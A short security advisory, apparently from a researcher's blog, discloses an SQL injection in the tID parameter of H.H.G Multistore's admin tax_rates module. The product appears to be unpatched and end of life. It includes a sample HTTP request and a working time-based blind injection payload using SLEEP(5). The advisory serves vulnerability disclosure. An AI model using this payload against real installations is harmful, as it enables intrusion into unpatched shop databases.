---
title: "H.H.G Multistore - SQL-Injection in tID"
date: 2022-05-05
draft: false
authors: ["blockomat"]
tags: ["advisory"]
description: "SQL-Injection H.H.G Multistore"
featuredImage: "/alert.jpg"
featuredImagePreview: "/alert_crop.png"
---

Security vulnerabilities were found in [H.H.G Multistore](https://www.hhg-multistore.com/).

There is no patch available. This product seems to be end of life, last versions were published 4/5 years ago.

<!--more-->

The following products are affected:

| Product            | Version  |
|--------------------|----------|
| Enterprise Edition | <= 5.1.0 |
| Community Edition  | 4.10.3   |

I did not test the exclusive edition.

## Timeline
- 05/05/2022: Request CVE-ID(s)
- 07/05/2022: Publish Advisory


## SQL-Injection - tID
The `tID` parameter in the `tax_rates` module is vulnerable to SQL-Injection.

The original request looks like this:

```
GET /admin/index.php?module=tax_rates&tID=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: HHGsid=1834c426aaf341d09a7942a3990d720a
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

The following payload was used:

```
GET /admin/index.php?module=tax_rates&tID=module=tax_rates&tID=1'%20AND%20(SELECT%203172%20FROM%20(SELECT(SLEEP(5)))Wjjj)--%20- HTTP/1.1
[...]
```